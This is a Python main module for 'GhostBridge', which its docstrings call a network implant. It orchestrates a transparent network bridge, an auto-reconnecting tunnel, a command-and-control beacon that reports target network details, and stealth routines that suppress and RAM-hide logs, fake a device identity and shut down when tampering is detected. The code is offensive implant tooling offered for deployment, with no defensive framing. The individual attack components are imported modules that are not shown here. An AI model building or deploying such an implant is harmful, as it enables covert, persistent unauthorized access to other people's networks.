"""
GhostBridge Main Application

Complete orchestration of all GhostBridge components:
- Bridge setup
- Tunnel management
- Beacon service
- Stealth operations
"""

from __future__ import annotations

import asyncio
import logging
import signal
import sys
from dataclasses import dataclass
from datetime import datetime
from typing import Optional

from ghostbridge import __version__
from ghostbridge.core.config import GhostBridgeConfig
from ghostbridge.core.bridge import BridgeManager
from ghostbridge.core.tunnel import TunnelManager, ConnectionState
from ghostbridge.core.stealth import StealthManager, StealthLevel
from ghostbridge.c2.beacon import BeaconService

logger = logging.getLogger(__name__)


@dataclass
class GhostBridgeStatus:
    """Overall system status."""

    version: str
    device_id: str
    uptime_seconds: float
    bridge_active: bool
    tunnel_connected: bool
    beacon_running: bool
    stealth_level: str
    last_beacon: Optional[datetime]


class GhostBridge:
    """
    Main GhostBridge application.

    Orchestrates all components for a complete implant deployment.
    """

    def __init__(self, config: Optional[GhostBridgeConfig] = None):
        """
        Initialize GhostBridge.

        Args:
            config: Configuration (loads from file if None)
        """
        self.config = config or GhostBridgeConfig.load()
        self._start_time = datetime.now()
        self._shutdown_event = asyncio.Event()

        # Initialize components
        self._bridge = BridgeManager(config=self.config)
        self._tunnel = TunnelManager(config=self.config)
        self._stealth = StealthManager(
            ram_only=self.config.stealth.ramfs_logs,
            fake_identity=self.config.stealth.fake_identity,
            panic_on_tamper=self.config.stealth.panic_on_tamper,
        )
        self._beacon: Optional[BeaconService] = None

        # Register panic callbacks
        self._stealth.register_panic_callback(self._on_panic)

    @property
    def uptime(self) -> float:
        """Get uptime in seconds."""
        return (datetime.now() - self._start_time).total_seconds()

    def _on_panic(self) -> None:
        """Handle panic event."""
        logger.critical("Panic callback triggered - initiating shutdown")
        self._shutdown_event.set()

    async def start(self) -> bool:
        """
        Start all GhostBridge components.

        Returns:
            True if all components started successfully
        """
        logger.info(f"Starting GhostBridge v{__version__}")
        logger.info(f"Device ID: {self.config.device.id}")
        logger.info(f"Device Name: {self.config.device.name}")

        # 1. Setup stealth first
        logger.info("Initializing stealth mode...")
        if self.config.stealth.ramfs_logs:
            await self._stealth.setup_ram_logging()
        await self._stealth.suppress_logs()
        await self._stealth.start_monitoring(interval=300)

        # 2. Setup bridge
        logger.info("Setting up network bridge...")
        if not await self._bridge.setup():
            logger.error("Bridge setup failed")
            return False

        # 3. Connect tunnel
        logger.info("Establishing tunnel connection...")
        if not await self._tunnel.connect():
            logger.warning("Initial tunnel connection failed - will retry")

        await self._tunnel.start_auto_reconnect()
        await self._tunnel.start_monitoring()

        # 4. Start beacon
        if self.config.beacon.enabled:
            logger.info("Starting beacon service...")
            self._beacon = BeaconService(config=self.config)

            # Provide status callbacks to beacon
            self._beacon.set_tunnel_status_provider(
                lambda: self._tunnel.state.value
            )
            self._beacon.set_network_info_provider(self._get_network_info)

            await self._beacon.start()

        logger.info("GhostBridge started successfully")
        return True

    async def stop(self) -> None:
        """Stop all GhostBridge components."""
        logger.info("Stopping GhostBridge...")

        # Stop in reverse order
        if self._beacon:
            await self._beacon.stop()

        await self._tunnel.disconnect()
        await self._bridge.teardown()
        await self._stealth.stop_monitoring()

        # Final log cleanup
        await self._stealth.suppress_logs()

        logger.info("GhostBridge stopped")

    async def run(self) -> None:
        """
        Run GhostBridge until shutdown.

        This is the main entry point for production use.
        """
        # Setup signal handlers
        loop = asyncio.get_event_loop()
        for sig in (signal.SIGTERM, signal.SIGINT):
            loop.add_signal_handler(sig, self._request_shutdown)

        try:
            if not await self.start():
                logger.error("Failed to start GhostBridge")
                sys.exit(1)

            # Wait for shutdown signal
            await self._shutdown_event.wait()

        except Exception as e:
            logger.error(f"Fatal error: {e}")
        finally:
            await self.stop()

    def _request_shutdown(self) -> None:
        """Request graceful shutdown."""
        logger.info("Shutdown requested")
        self._shutdown_event.set()

    def _get_network_info(self) -> dict:
        """Get network info for beacon."""
        return {
            "bridge_active": self._bridge.is_active,
            "target_mac": self._bridge.target_mac,
            "uptime": self.uptime,
        }

    async def get_status(self) -> GhostBridgeStatus:
        """Get overall system status."""
        return GhostBridgeStatus(
            version=__version__,
            device_id=self.config.device.id,
            uptime_seconds=self.uptime,
            bridge_active=self._bridge.is_active,
            tunnel_connected=self._tunnel.is_connected,
            beacon_running=self._beacon.is_running if self._beacon else False,
            stealth_level=self._stealth.level.value,
            last_beacon=self._beacon.stats.last_success_time if self._beacon else None,
        )

    async def health_check(self) -> dict:
        """
        Perform health check on all components.

        Returns:
            Health status dictionary
        """
        checks = {
            "bridge": False,
            "tunnel": False,
            "beacon": False,
            "stealth": False,
        }

        # Check bridge
        try:
            status = await self._bridge.get_status()
            checks["bridge"] = status.is_active
        except Exception:
            pass

        # Check tunnel
        try:
            tunnel_status = await self._tunnel.get_status()
            checks["tunnel"] = tunnel_status.is_connected
        except Exception:
            pass

        # Check beacon
        if self._beacon:
            checks["beacon"] = self._beacon.is_running

        # Check stealth
        checks["stealth"] = True  # Always considered healthy

        return {
            "healthy": all(checks.values()),
            "components": checks,
            "uptime": self.uptime,
            "timestamp": datetime.now().isoformat(),
        }


async def main() -> None:
    """Main entry point."""
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[logging.StreamHandler()],
    )

    # Reduce noise from httpx
    logging.getLogger("httpx").setLevel(logging.WARNING)

    try:
        config = GhostBridgeConfig.load()
    except Exception as e:
        logger.error(f"Failed to load configuration: {e}")
        sys.exit(1)

    ghost = GhostBridge(config=config)
    await ghost.run()


if __name__ == "__main__":
    asyncio.run(main())

